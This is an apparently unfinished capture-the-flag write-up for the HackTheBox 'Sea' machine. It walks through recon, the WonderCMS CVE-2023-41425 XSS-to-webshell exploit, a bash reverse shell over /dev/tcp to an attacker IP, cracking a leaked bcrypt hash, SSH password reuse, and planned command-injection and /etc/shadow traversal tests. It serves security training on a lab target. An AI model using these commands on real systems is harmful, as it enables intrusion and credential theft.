# Sea - HackTheBox

- **IP:** 10.129.6.48 (originally 10.129.20.143)
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy
- **Flags:** User ❌ | Root ❌

---

## 1) Recon — Nmap

**Command**
```bash
nmap -p- --min-rate 3000 -Pn -oA nmap/SeaAllPorts $IP
nmap -p22,80 -sSCV --min-rate=2000 -Pn -oN nmap/SeaServicesVersions $IP
```

**Key Output**
- 22/tcp — OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- 80/tcp — Apache/2.4.41 (Ubuntu), PHP (PHPSESSID cookie), title "Sea - Home"

**Decision:** Only SSH + HTTP. This is a web-focused box. Added `sea.htb` to `/etc/hosts`.

---

## 2) Web Enumeration — ffuf

**Command**
```bash
ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://10.129.20.143/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -fc 403 -v
```

**Key findings (non-403):**

| Path                       | Status           | Notes                            |
| -------------------------- | ---------------- | -------------------------------- |
| `/` / `index.php` / `home` | 200 (3680 bytes) | Main page                        |
| `/404` / `0`               | 200 (3371 bytes) | Custom 404 page                  |
| `/data`                    | 301              | Directory — needs deeper fuzzing |
| `/messages`                | 301              | Directory — needs deeper fuzzing |
| `/plugins`                 | 301              | Directory — needs deeper fuzzing |
| `/themes`                  | 301              | Directory — needs deeper fuzzing |

**Also found (from browsing):**
- `/contact.php` — "Competition registration - Sea" form (Name, Email, Age, Country, Website)
- `/loginURL` — Login page endpoint

**Decision:** Directory structure (`data/`, `messages/`, `plugins/`, `themes/`) suggests a CMS. Need to identify which one.

---

## 3) CMS Identification — WonderCMS

**How identified:**
- Browsing page source revealed author `velik71`
- Googled `velik71` → found WonderCMS community page with "bike" theme 2.0 by velik71
- Downloaded bike theme ZIP, extracted images → identical to images on sea.htb
- Directory structure (data/, messages/, plugins/, themes/) matches WonderCMS (flat-file PHP CMS, no database)

**Key reasoning chain:**
- PHP + no database port = flat-file CMS
- `data/`, `themes/`, `plugins/` directory combo narrows it down
- Author name `velik71` confirmed it as WonderCMS

---

## 4) Exploit — CVE-2023-41425 (WonderCMS 3.4.2 XSS to RCE)

**Discovery**
```bash
searchsploit wondercms
searchsploit -m php/remote/52271.py
```

**Exploit:** `52271.py` — WonderCMS 3.4.2 authenticated RCE via XSS
- Creates a malicious JS payload hosted on attacker's HTTP server
- XSS payload injected via contact.php "Website" field → triggers when admin views submissions
- JS payload uploads a PHP webshell as a "theme" to `/themes/malicious/malicious.php`

**Setup issues:**
- searchsploit copy had formatting issues → `dos2unix 52271.py` to fix
- Required Python HTTP server for hosting the XSS payload

**Commands**
```bash
# Terminal 1: HTTP server to host XSS payload
python3 -m http.server 6969

# Terminal 2: Run exploit (generates XSS link and submits via contact form)
python3 52271.py --url http://sea.htb/loginURL --xip 10.10.14.69 --xport 6969

# Terminal 3: Listener for reverse shell
rlwrap nc -lnvp 42069
```

**Triggering the shell:**
```bash
# After exploit runs and webshell is uploaded, trigger reverse shell:
curl -s 'http://sea.htb/themes/malicious/malicious.php' --get \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.69/42069 0>&1'"
```

**Result:** Reverse shell as `www-data@sea`

---

## 5) Credential Discovery — database.json

**Found in:** `/var/www/sea/data/files/database.json`

Bcrypt hash for WonderCMS admin:
```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
```

**Cracking:**
```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > YourMomsHash.txt
hashcat -m 3200 YourMomsHash.txt /usr/share/wordlists/rockyou.txt --force
```
- `-m 3200` = bcrypt mode (for `$2y$` hashes)
- **Cracked password:** `mychemicalromance`

---

## 6) Foothold — SSH as amay

Tried cracked password against SSH users on the box:
```bash
ssh amay@10.129.6.48
# Password: mychemicalromance
```

**Result:** SSH shell as `amay`. User flag location TBD.

---

## 7) Privilege Escalation — Internal Service Discovery

**Enumeration**
```bash
sudo -l          # No sudo privileges
find / -perm /4000 2>/dev/null   # All standard SUID binaries
ss -tlnp         # Internal services check
```

**Key finding from `ss -tlnp`:**

| Address | Port | Notes |
|---------|------|-------|
| 0.0.0.0 | 80 | Apache (known) |
| 0.0.0.0 | 22 | SSH (known) |
| 127.0.0.1 | **8080** | **Internal web service — not visible from nmap** |
| 127.0.0.1 | 50919 | Unknown internal service |
| 127.0.0.53 | 53 | systemd-resolved DNS |

**Decision:** Port 8080 on localhost = hidden web app. Classic easy-box privesc pattern.

---

## 8) Port Forwarding & Internal Web App

**Command**
```bash
ssh -L 9090:127.0.0.1:8080 amay@10.129.6.48
```
**Flags/Notes**
- `-L 9090:127.0.0.1:8080` = forward local port 9090 → target's localhost:8080
- Browse `http://127.0.0.1:9090` on Kali after connecting

**Auth:** HTTP Basic Auth — `amay:mychemicalromance` works (password reuse again)

**What's running:** "System Monitor(Developing)" — a PHP app with:
- **Disk Usage** display
- **System Management** buttons: `Clean system with apt`, `Update system`, `Clear auth.log`, `Clear access.log`
- **Analyze Log File** — dropdown (access.log) + Analyze button, reads `/var/log/auth.log`

**Attack vector:** System Management buttons likely execute OS commands as root. Log file analyzer may be vulnerable to command injection or path traversal in the `log_file` parameter.

**Next steps:**
- [ ] Intercept form submissions (Analyze button, management buttons) to find parameter names
- [ ] Test command injection in log_file parameter (`;id`, `|id`, etc.)
- [ ] Test path traversal (`/etc/shadow`, `/root/root.txt`)

---

## Lessons Learned
- `velik71` author attribution in page source → Google OSINT → CMS identification
- WonderCMS is a flat-file CMS (no database) — `database.json` is the config/user store
- searchsploit copies sometimes have encoding issues → `dos2unix` to fix
- Contact form "Website" field was the XSS injection vector for CVE-2023-41425
- bcrypt hashes (`$2y$`) = hashcat mode 3200
- `ss -tlnp` is the highest-signal privesc check on Linux — reveals internal services invisible to external nmap
- SSH port forwarding (`-L`) to access internal web apps is a common HTB pattern
- Password reuse across services (SSH creds → HTTP Basic Auth)
